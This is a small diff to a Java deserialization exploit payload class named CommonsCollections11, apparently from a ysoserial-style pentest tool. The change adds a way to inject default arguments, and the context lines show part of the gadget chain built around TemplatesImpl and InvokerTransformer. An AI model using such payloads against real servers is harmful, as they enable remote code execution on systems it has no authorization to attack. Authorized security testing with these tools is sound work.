@@ -34,6 +34,8 @@ java.security.manager off OR set jdk.xml.enableTemplatesImplDeserialization=true
  */
 public class CommonsCollections11 implements Payload {
 
+    private String[] args;
+
     /**
      *
      * @param args
@@ -45,6 +47,8 @@ public class CommonsCollections11 implements Payload {
      */
     @Override
     public Object getPayload(String[] args) throws Exception {
+        if (this.args != null)
+            args = this.args;
         final Object templates = Gadgets.createTemplatesImpl(args[0]);
         // mock method name until armed
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -93,4 +97,10 @@ public class CommonsCollections11 implements Payload {
 
         return map;
     }
+
+    @Override
+    public void injectDefaultArgs(String[] args) {
+        this.args = args;
+    }
+
 }
